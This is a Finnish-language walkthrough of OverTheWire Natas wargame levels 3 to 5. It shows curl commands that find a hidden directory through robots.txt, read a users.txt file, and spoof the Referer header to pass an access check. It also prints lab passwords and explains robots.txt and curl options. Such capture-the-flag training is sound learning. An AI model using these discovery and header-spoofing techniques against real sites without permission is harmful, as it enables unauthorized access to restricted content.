# level 3 - 5


edellisessä level 2:ssa selvitettiin level 3:sen salasanaa niin se oli HTML koodi tiedoston polussa, ja sen index of .. tiedoston polun alla ja users.txt formaattissa.

```
PS C:\> curl http://natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI@natas2.natas.labs.overthewire.org/files/users.txt
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```


# level 3

level 3 jatkuu tästä nyt 

sama oletuksena näkymältään että ei näytä kauheasti mitään erioiselta, seuraavaksi testataan näitä ominaisuutta ja tarkistellaan eli;
- oikean hiiren klikkausta tai F12 tai CTRL + U
  
![alt text](./kuvat/level3-0.png)


Päästiin ainakin tähän "view-source" eli html koodin näkymänsä, että ei ole kauheasti mitään johtolankaa eli jummissa ollaan jälleen kerran. Mitäs seuraavaksi pitäisi tehdä??
![alt text](./kuvat/level3-1.png)

mentiin nyt tähän robots.txt polkuun ja löydettiin disallowed joku `secrets` vain e on muutettu 3:ksi.
![alt text](./kuvat/level3-2.png)

Kokeilaan vaan ja yritetään lisätä toi secrets ja korvataan se siihen "robots.txt" tilale, ja katsotaan mitä tapahtuu seuraavaksi. Näin ollen päästiin ja löydettiin "index of ..." tiedosto polku, ja tämä mysteerinen `users.txt` joten.
![alt text](./kuvat/level3-3.png)


ja tuloksena näkyy level 4:sen salasana (jei!!)

![alt text](./kuvat/level3-4.png)


## level 3 - 1 robots.txt

Ratkaisuksi on "robots.txt, mikä se on: joka on WWW-palvelimen juurihakemiston (root) sijoitetta tiedosto, jolla voi hakea/antaa tietoja ja rajoituksia hakuroboteille (bottiohjelma, joka hakee selaimien tapoja webin palvleimen olevia verkkosivustojen indeksiointi eli tallentaa niistä tiedonhakua varten tittyjä kenttiä). 

robots.txt on tiedosto, joka määrittelee, mitkä osat verkkosivustosta ovat hakukoneiden (kuten Google, Bing, jne.) robotteja ja muita verkkoskannereita varten käytettävissä, ja mitkä osat eivät ole. Se on tärkeä osa hakukoneoptimointia (SEO) ja tietoturvaa, mutta se ei ole ehdottomasti pakollinen kaikilla verkkosivustoilla.


Milloin robots.txt on tärkeä?

- Hakukoneoptimointi (SEO): Jos et halua, että tietyt sivut tai osiot (kuten sisäiset testisivut tai hallintapaneelit) indeksoituvat hakukoneissa, voit käyttää robots.txt-tiedostoa estämään niiden skannauksen.

- Tietoturva: Jos sivustolla on tärkeitä tai arkaluonteisia resursseja, joita ei pitäisi näkyä hakukoneissa, voi olla hyvä käyttää `robots.txt`-tiedostoa estämään niiden indeksoinnin. On kuitenkin tärkeää muistaa, että robots.txt ei ole tietoturvatoimi, vaan ainoastaan ohjeistus hakukoneiden robotteja varten. Se ei estä pääsyä palvelimelle, vaan ainoastaan kertoo, mitä robotit eivät saisi skannata. Jos tiettyjä osia on tarkoitus pitää täysin suojattuina, se tulee tehdä muunlaisin keinoin, kuten autentikoinnilla tai palomuurisäännöillä.


Entä jos `robots.txt`-tiedostoa ei ole?

Jos verkkosivustolla ei ole `robots.txt`- tiedostoa, se ei tarkoita automaattisesti mitään erityistä. Se voi olla tarkoituksellinen valinta, jos omistajat eivät ole huolissaan hakukoneiden robotin skannauksesta, tai he haluavat, että kaikki sivut ovat vapaasti hakukoneiden indeksoitavissa. Ei-oleminen ei ole turvallisuusongelma, mutta se voi olla haitaksi SEO
kannalta tai saattaa paljastaa yksityiskohtia, joita ei haluttaisi hakukoneiden indeksoivan.


Jos `robots.txt`-tiedostoa ei ole, hakukoneet voivat indeksoida kaikkia sivuja, ellei niitä estetä muilla tavoilla, kuten noindex-metatageilla HTML-sivujen sisällä.


Pitäisikö robots.txt olla aina verkkosivustolla?
Ei ole pakollista, että jokaisella verkkosivustolla on `robots.txt`-tiedosto, mutta se on hyvä käytäntö useimmissa tapauksissa, erityisesti:

- SEO: Jos haluat ohjata hakukoneiden robotteja tiettyjen sivujen indeksoimisessa.
- Tietoturva: Jos haluat estää hakukoneita indeksoimasta tärkeitä tai arkaluonteisia osia verkkosivustosta (mutta muista, että tämä ei ole turvallisuusratkaisu, vaan vain suositus roboteille).
- Yksityisyys: Jos haluat varmistaa, ettei hakukoneet pääse käsiksi esimerkiksi admin-pohjaisille sivuille tai muille yksityisille osille.


Jos sivustollasi ei ole `robots.txt`-tiedostoa ja haluat lisätä sen, voit luoda yksinkertaisen robots.txt-tiedoston verkkosivustosi juureen ja määrittää siinä, mitä osia haluat sallia tai estää hakukoneilta.


Voiko puuttuva `robots.txt` olla ongelma?
Jos `robots.txt` puuttuu, se ei ole itsessään vakava ongelma, mutta se voi olla:

- SEO hallinnan puute: Jos et halua, että tietyt sivut indeksoituvat, voit päätyä tilanteeseen, jossa hakukoneet indeksoivat sivuja, joita et haluaisi, kuten yksityisiä tai ei-toivottuja sisältöjä.
- Tietoturvaseuraamuksia: Jos tiedät, että verkkosivustosi sisältää herkkiä osia (kuten hallintapaneelit, sisäiset testisivut), mutta sinulla ei ole `robots.txt`-tiedostoa, hakukoneet voivat skannata ja näyttää nämä sivut hakutuloksissa, vaikka et haluaisi.


On olemassa muita työkaluja jonka voisi skannata ja hakea palvelimelta, mitä hakemistoja ja tiedostoja sen takana voi olla esim. työkalulla kuin <b>Gobuster</b> - eli joka ohjelmistotyökalu vekrkopalvelimien hakemistojen raa'alle pakottimelle, ja tätä ei ole esiasennettu kali linux:ssa.

robots juttusta vähä lisätietoa; https://www.robotstxt.org/robotstxt.html

## level 3 - 2 curl


ei kauheen erikoista, mutta tämä on sama idea kuin eka kuva, mutta html koodi muodossa ja vastaavasti perustoitettu se level 3:sen salasana. Sitten seuraavaksi pitää selvittää level 4:sen salasana ja miten?

```
PS C:\> curl  http://natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH@natas3.natas.labs.overthewire.org   
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas3", "pass": "3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH" };</script></head>
<body>
<h1>natas3</h1>
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
</body></html>
```

curl komennosta voidaan ehkä mahdollista tarkistaa onko `robots.txt` olemassa, mutta.. tämä onnistuu lähettämällä HTTP-pyyntö verkkosivuston juurihakemistoon 
Tämä komento pyytää vain HTTP-otsakkeet (headers), jolloin voit nähdä, onko tiedosto olemassa ja mitä statuskoodia palvelin palauttaa. Eli tosiaan toi `HTTP/1.1 200 OK` tarkoittaa on olemassa. vaikka perässä ei olisi tuota polkua `robots.txt` se silti sanoisi OK ja jos on HTTP tuloksena 404 - tarkoittaa että tiedostoa ei löydy.

```
PS C:\> curl -I http://natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH@natas3.natas.labs.overthewire.org/robots.txt
HTTP/1.1 200 OK
Date: Sat, 09 Nov 2024 13:57:07 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Thu, 19 Sep 2024 07:03:23 GMT
ETag: "21-6227384b61f51"
Accept-Ranges: bytes
Content-Length: 33
Content-Type: text/plain
```

kuitenkin tästä voidaan jatkaa ja lisätän polun perään toi `robots.txt` ja tuloksena tulostui tällainen. Tämä itsensä palauttaa sen tiedoston sisällön jos on olemassa ja näin ollen on määritellyt säännöt eli toi `s3cr3t`. 
Jos tätä `robots.txt` - ei ole, niin haku konetta voiva indeksoida kaikki sivut, ellei niitä estettä muilla tavoin kuten metatangeilal ja/tai HTTP-päivityksellä. 

```
PS C:\> curl  http://natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH@natas3.natas.labs.overthewire.org/robots.txt
User-agent: *
Disallow: /s3cr3t/
```



tosiaan sitten otettaan toi "Disallow" koodi ja korvataan se "robots.txt" paikalle eli..

```
PS C:\> curl  http://natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH@natas3.natas.labs.overthewire.org/s3cr3t/       
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /s3cr3t</title>
 </head>
 <body>
<h1>Index of /s3cr3t</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2024-09-19 07:03  </td><td align="right"> 40 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.58 (Ubuntu) Server at natas3.natas.labs.overthewire.org Port 80</address>
</body></html>
```


sitten näin ollen saada tuloksena sama "index of..." jotakin sivustoa ja meitä kiinnostaa jälleen kerran toi `users.txt` ja voidaan avata joko selaimesta tai terminaalista (ei väliä kummasta)

```
PS C:\> curl  http://natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH@natas3.natas.labs.overthewire.org/s3cr3t/users.txt
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

<hr>


# level 4

sitten vaan mennään eteenpäin eli mennään level 4:lle ja haettu level 3:sta se salasana ja kirjaudutta ensimmäisenä perus oletus näköinen ei mitään erikoista. Perus refresh page jälkeen siinä välilehden lopussa näkyy toi `/index.php` ja ei väliä monta kertaa klikkaa tuota "refresh page" niin se toistaa tämän saman sivuston

![alt text](./kuvat/level4-0.png)
![alt text](./kuvat/level4-1.png)

sitten alettaan suorittaa toimenpidettä eli:
- oikean hiiren klikkauksesta , CTRL + U / F12
Eli tosiaan "robots.txt", tässäkin pieni huomoina rivillä 15 - antaa että "access disallowed" prosessia ei enään, toimi ja joten polku `/robots.txt` sekään ei toimi.

![alt text](./kuvat/level4-2.png) <br>
![alt text](./kuvat/level4-3.png)

## level 4 - 1

terminaali tänne ja jos toistaa ton perässä olevan `/index.php` niin antaa saman tämän html koodin pätkän

```
PS C:\> curl http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org/       
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```


tässäkin sama ideana, kun mentäisiin robots.txt polkuun ikään kuin edellisen level 3 mukaan, mutta nyt tässä ei toimi. mitäs neuvoksi??
```
PS C:\> curl http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org/robots.txt
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.58 (Ubuntu) Server at natas4.natas.labs.overthewire.org Port 80</address>
</body></html>
```

Jotakin outoa säätöä tässä curl komennossa, mutta yhtäkkiä alkoi pelittää voi olla jotakin kirjoitus virheitä, mutta jälkimmäisessä komennossa huomaa sen eronsa

```
PS C:\> curl -Headers "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org
curl: (3) URL rejected: Malformed input to a URL function
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>

PS C:\> curl -h "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org      
Usage: curl [options...] <url>
Unknown category provided, here is a list of all categories:

 auth        Authentication methods
 connection  Manage connections
 curl        The command line tool itself
 deprecated  Legacy
 dns         Names and resolving
 file        FILE protocol
 ftp         FTP protocol
 global      Global options
 http        HTTP and HTTPS protocol
 imap        IMAP protocol
 ldap        LDAP protocol
 output      Filesystem output
 pop3        POP3 protocol
 post        HTTP POST specific
 proxy       Options for proxies
 scp         SCP protocol
 sftp        SFTP protocol
 smtp        SMTP protocol
 ssh         SSH protocol
 telnet      TELNET protocol
 tftp        TFTP protocol
 timeout     Timeouts and delays
 tls         TLS/SSL related
 upload      Upload, sending data
 verbose     Tracing, logging etc

PS C:\> curl -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>

```
eli tämän jälkimäinen komento: `PS C:\> curl -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org` - niin tämä alkoi pelittää ja toisti sen level 5:sen salasanan

vastaus: periaatteessa ei väliä onko välilehti sivusto tai linux/powershell terminaalissa siinä löytyi vihjeenä <i>"authorized users should come only from [...]."</i> niin tämä toi jotakin curl komentojen `Referer` headeriä viitatten natas5 polkuun.

tai vaihtoehtoinen vastaus, tämäkin toimii, mutta perus löytyy netistä lisätietoa: 

tässä komennossa tapahtuu `-u` <username:password> --referer <URL-target> <URL-current>
```
PS C:\> curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org       
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

## level 4 - 2 curl referer 

Referer:istä vähä teoriaa

referer - vaihtoehto käyttäminen on toi .net-ratkaisun virhekorjaus, ja tämä viittaa logiikka riippuu viittaavasta sivutosta. 

suom. lähettäjä. Periaatteessa käyttää HTTP-pyyntöä liittyviä kenttä, joka kertoo, mistä vekrkosivustosta pyyntöä on lähtöisin. Eli kertoo, mikä URL-osoite on ohjannut käytäjän nykyiselle sivulle. Esimerkiksi, jos käyttäjä klikkaa linkkiä toisella sivulla ja saapuu nykyiselle sivulle, niin tämä toinen sivu (jolta linkki tuli) näkyy referrer-kentässä.


esim, tässä määrittää "referrin", eli mistä osoitteesta pyyntö on tullut, sekä tämä lähettää pyynnön kohdesivulle ja ilmiottaa että pyyntö on tullut osoitteesta "http://example.com". Lyhyesti sanottuna MISTÄ sivustosta MIHIN sivustoon.
PS C:\> curl -e "http://example.com" https://www.example.org

päätteelle ei ole mitään väliä, eli vaikka ois domainissa (.org .fi .com ja jne) eli merkityksellistä. Referrer kenttä kertoo vain sen verkkosivuston tai URL-osoitteen, jolta pyyntö on tullut, riippumatta pääteosasta (domain-päätteestä).

Referrerin avulla voidaan siis seurata, mistä URL-osoitteesta pyyntö on lähtenyt ja minne se menee. Se ei sisällä käyttäjätietoja kuten käyttäjänimeä tai salasanaa, vaan kertoo vain verkkosivuston polun.


muita referrien pyyntöä ja esim.
`-A` / `--user-agent` - määrittää user-agentin, joka kertoo, mikä selain tai ohjelma tekee pyynnön, ja tämä on tärkeä, koska jotkut palvelimet voivat käsitellä pyyntöä eri tavalla.

esim. tässä määritetään "Mozilla/5.0/ pyyntöä vaikutta tulevan chrome selaimelta.
`PS C:\> curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" https://example.com`


`-H` / `--header` - muita HTTP-headerin arvoja. Tämän antaa mahdollisuuden lisätä custom HTTP-headerin pyyntöä. Tämä asettaa esim. Referrer-kentän manuaalisen tai muita kenttiä kuten <b>Authorization</b>

esim.  refer-headerin HTTP pyyntölä, jossa ensimmäisenä referr on example.com ja mikäli jos halutaan täysin hallita pyynnön headerit.
`PS C:\> curl -H "Referer: https://example.com" https://example.com`



[https://catonmat.net/cookbooks/curl/add-referrer
https://martint86.github.io/curl-referer/
https://wiki.sharewiz.net/doku.php?id=curl:referer_user_agent
https://gist.github.com/afair/5265874
https://www.cyberciti.biz/faq/linux-unix-appleosx-bsd-curl-command-httpreferer/

](https://curl.se/docs/tutorial.html
https://catonmat.net/cookbooks/curl/add-referrer
https://martint86.github.io/curl-referer/
https://wiki.sharewiz.net/doku.php?id=curl:referer_user_agent
https://gist.github.com/afair/5265874
https://www.cyberciti.biz/faq/linux-unix-appleosx-bsd-curl-command-httpreferer/
https://dev.to/jvon1904/a-beginners-guide-to-curl-part-1-4j4j
https://supporthost.com/curl-command-linux/
https://loadfocus.com/fi-fi/glossary/what-is-curl-command)
